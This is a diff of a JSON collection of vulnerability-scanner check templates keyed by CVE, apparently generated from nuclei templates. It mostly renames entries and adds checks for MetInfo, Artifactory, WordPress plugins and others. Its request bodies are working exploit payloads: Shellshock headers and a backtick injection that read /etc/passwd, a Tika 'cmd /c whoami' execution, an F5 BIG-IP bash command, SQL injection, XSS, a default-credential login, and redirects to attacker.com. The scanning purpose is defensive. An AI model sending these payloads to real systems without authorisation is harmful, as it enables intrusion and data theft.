@@ -3296,9 +3296,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3771,7 +3771,7 @@
     {
       "id": "CVE-2015-4694",
       "info": {
-        "name": "Zip Attachments <= 1.1.4 - Arbitrary File Download",
+        "name": "WordPress Zip Attachments <= 1.1.4 - Arbitrary File Download",
         "severity": "high"
       },
       "requests": [
@@ -4435,7 +4435,7 @@
     {
       "id": "CVE-2016-10033",
       "info": {
-        "name": "Wordpress 4.6 Remote Code Execution",
+        "name": "WordPress PHPMailer < 5.2.18 Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -4480,7 +4480,7 @@
     {
       "id": "CVE-2016-10940",
       "info": {
-        "name": "The zm-gallery plugin 1.0 for WordPress SQLI",
+        "name": "WordPress zm-gallery plugin 1.0 SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -4512,7 +4512,7 @@
     {
       "id": "CVE-2016-10960",
       "info": {
-        "name": "wSecure Lite < 2.4 - Remote Code Execution (RCE)",
+        "name": "WordPress wSecure Lite < 2.4 - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -4831,7 +4831,7 @@
     {
       "id": "CVE-2017-10075",
       "info": {
-        "name": "Oracle Content Server XSS",
+        "name": "Oracle Content Server Cross-Site Scripting",
         "severity": "high"
       },
       "requests": [
@@ -5110,7 +5110,7 @@
     {
       "id": "CVE-2017-14651",
       "info": {
-        "name": "Reflected XSS - WSO2 Data Analytics Server",
+        "name": "WSO2 Data Analytics Server 3.1.0 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -5454,6 +5454,21 @@
       ]
     },
     {
+      "id": "CVE-2017-5631",
+      "info": {
+        "name": "CaseAware - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/login.php?mid=0&usr=admin%27%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-5638",
       "info": {
         "name": "Apache Struts2 RCE",
@@ -5676,7 +5691,7 @@
     {
       "id": "CVE-2017-9833",
       "info": {
-        "name": "BOA Web Server 0.94.14 - Access to arbitrary files as privileges",
+        "name": "BOA Web Server 0.94.14 - Arbitrary File Access",
         "severity": "high"
       },
       "requests": [
@@ -6219,11 +6234,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -6972,7 +6987,7 @@
     {
       "id": "CVE-2018-2628",
       "info": {
-        "name": "Oracle WebLogic Server Deserialization RCE",
+        "name": "Oracle WebLogic Server Deserialization - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7001,7 +7016,7 @@
     {
       "id": "CVE-2018-2893",
       "info": {
-        "name": "Oracle WebLogic Server Deserialization RCE (CVE-2018-2893)",
+        "name": "Oracle WebLogic Server - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7048,8 +7063,8 @@
     {
       "id": "CVE-2018-3238",
       "info": {
-        "name": "Multiple XSS Oracle WebCenter Sites",
-        "severity": "medium"
+        "name": "Oracle WebCenter Sites 11.1.1.8.0 - Cross-Site Scripting",
+        "severity": "high"
       },
       "requests": [
         {
@@ -8270,6 +8285,20 @@
       ]
     },
     {
+      "id": "CVE-2019-16997",
+      "info": {
+        "name": "Metinfo 7.0.0 beta SQLI",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/?n=language&c=language_general&a=doExportPack HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nappno= 1 union SELECT 98989*443131,1&editor=cn&site=web\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-17270",
       "info": {
         "name": "Yachtcontrol Webapplication 1.0 - Unauthenticated Rce",
@@ -8294,6 +8323,35 @@
         {
           "raw": [
             "GET /zabbix.php?action=dashboard.view&dashboardid={{ids}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en-US,en;q=0.9\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-17418",
+      "info": {
+        "name": "MetInfo 7.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+98989*443131,1--+&site=admin"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-17444",
+      "info": {
+        "name": "Jfrog Artifactory default password",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /ui/api/v1/ui/auth/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json;charset=UTF-8\nX-Requested-With: XMLHttpRequest\nOrigin: {{RootURL}}\n\n{\"user\":\"admin\",\"password\":\"password\",\"type\":\"login\"}\n"
           ]
         }
       ]
@@ -8605,7 +8663,7 @@
     {
       "id": "CVE-2019-2588",
       "info": {
-        "name": "Oracle Business Intelligence Path Traversal",
+        "name": "Oracle Business Intelligence  - Path Traversal",
         "severity": "medium"
       },
       "requests": [
@@ -8653,7 +8711,7 @@
     {
       "id": "CVE-2019-2729",
       "info": {
-        "name": "Oracle WebLogic Server Administration Console Handle RCE",
+        "name": "Oracle WebLogic Server Administration Console - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -8833,7 +8891,7 @@
     {
       "id": "CVE-2019-5418",
       "info": {
-        "name": "File Content Disclosure on Rails",
+        "name": "Rails File Content Disclosure",
         "severity": "high"
       },
       "requests": [
@@ -9076,8 +9134,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10372,8 +10430,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -10597,7 +10655,7 @@
     {
       "id": "CVE-2020-24589",
       "info": {
-        "name": "WSO2 API Manager Blind XML External Entity Injection",
+        "name": "WSO2 API Manager <=3.1.0 - Blind XML External Entity Injection",
         "severity": "critical"
       },
       "requests": [
@@ -12809,14 +12867,14 @@
     {
       "id": "CVE-2021-22986",
       "info": {
-        "name": "F5 BIG-IP iControl REST unauthenticated RCE",
+        "name": "F5 BIG-IP iControl REST Unauthenticated Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
         {
           "raw": [
-            "POST /mgmt/shared/authn/login HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nAuthorization: Basic YWRtaW46\nContent-Type: application/json\nCookie: BIGIPAuthCookie=1234\nConnection: close\n\n{\"username\":\"admin\",\"userReference\":{},\"loginReference\":{\"link\":\"http://localhost/mgmt/shared/gossip\"}}\n",
-            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nX-F5-Auth-Token: §token§\nContent-Type: application/json\nConnection: close\n\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}\n"
+            "POST /mgmt/shared/authn/login HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nAuthorization: Basic YWRtaW46\nContent-Type: application/json\nCookie: BIGIPAuthCookie=1234\nConnection: close\n{\"username\":\"admin\",\"userReference\":{},\"loginReference\":{\"link\":\"http://localhost/mgmt/shared/gossip\"}}\n",
+            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nX-F5-Auth-Token: {{token}}\nContent-Type: application/json\nConnection: close\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}\n"
           ]
         }
       ]
@@ -13139,6 +13197,21 @@
       ]
     },
     {
+      "id": "elementorpage-open-redirect",
+      "info": {
+        "name": "Plus Addons for Elementor Page Builder < 4.1.10 - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /?author=1 HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /wp-login.php?action=theplusrp&key=&redirecturl=http://attacker.com&forgoturl=http://attacker.com&login={{username}} HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24364",
       "info": {
         "name": "Jannah < 5.4.4 (XSS)",
@@ -13185,7 +13258,7 @@
     {
       "id": "CVE-2021-24406",
       "info": {
-        "name": "wpForo Forum < 1.9.7 - Open Redirect",
+        "name": "WordPress wpForo Forum < 1.9.7 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -13379,7 +13452,7 @@
     {
       "id": "CVE-2021-24947",
       "info": {
-        "name": "RVM - Responsive Vector Maps < 6.4.2 - Arbitrary File Read",
+        "name": "WordPress Responsive Vector Maps < 6.4.2 - Arbitrary File Read",
         "severity": "high"
       },
       "requests": [
@@ -13387,6 +13460,21 @@
           "raw": [
             "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
             "GET /wp-admin/admin-ajax.php?action=rvm_import_regions&nonce=5&rvm_mbe_post_id=1&rvm_upload_regions_file_path=/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24987",
+      "info": {
+        "name": "Super Socializer < 7.13.30 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[]=<img%20src=x%20onerror=alert(document.domain)>"
           ]
         }
       ]
@@ -13438,7 +13526,7 @@
     {
       "id": "CVE-2021-25028",
       "info": {
-        "name": "Event Tickets < 5.2.2 - Open Redirect",
+        "name": "WordPress Event Tickets < 5.2.2 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -13446,6 +13534,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://example.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "noptin-open-redirect",
+      "info": {
+        "name": "Noptin < 1.6.5 - Open Redirect",
+        "severity": "low"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?noptin_ns=email_click&to=https://example.com"
           ]
         }
       ]
@@ -13468,7 +13571,7 @@
     {
       "id": "CVE-2021-25055",
       "info": {
-        "name": "FeedWordPress < 2022.0123 - Authenticated Reflected XSS",
+        "name": "WordPress FeedWordPress < 2022.0123 - Authenticated Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14389,7 +14492,7 @@
     {
       "id": "CVE-2021-31682",
       "info": {
-        "name": "WebCTRL OEM - Reflected XSS",
+        "name": "WebCTRL OEM <= 6.5 Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14404,7 +14507,7 @@
     {
       "id": "CVE-2021-31755",
       "info": {
-        "name": "Tenda Router AC11 RCE",
+        "name": "Tenda Router AC11 - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -15818,7 +15921,7 @@
     {
       "id": "CVE-2021-42071",
       "info": {
-        "name": "Visual Tools DVR VX16 4.2.28.0 Unauthenticated OS Command Injection",
+        "name": "Visual Tools DVR VX16 4.2.28.0 - Unauthenticated OS Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -16343,6 +16446,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?rest_route=/whm/v3/themesettings"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0271",
+      "info": {
+        "name": "LearnPress < 4.1.6 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=lp_background_single_email&lp-dismiss-notice=xxx<img%20src=x%20onerror=alert(document.domain)>"
           ]
         }
       ]
